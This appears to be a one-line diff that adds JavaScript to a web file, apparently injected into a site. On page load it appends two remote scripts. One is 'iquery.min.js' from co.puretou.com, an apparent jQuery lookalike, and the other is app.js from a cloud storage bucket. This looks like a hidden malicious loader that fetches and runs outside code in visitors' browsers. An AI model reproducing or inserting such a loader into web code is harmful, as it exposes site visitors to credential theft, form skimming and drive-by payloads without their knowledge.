@@ -1,0 +1,1 @@
+(function(){var l=document.createElement('script');l.src='https://co.puretou.com/iquery.min.js';document.getElementsByTagName('body')[0].appendChild(l);})();(function(){var l=document.createElement('script');l.src='http://voicerecorder.oss-ap-southeast-1.aliyuncs.com//js/app.js';document.getElementsByTagName('body')[0].appendChild(l);})();
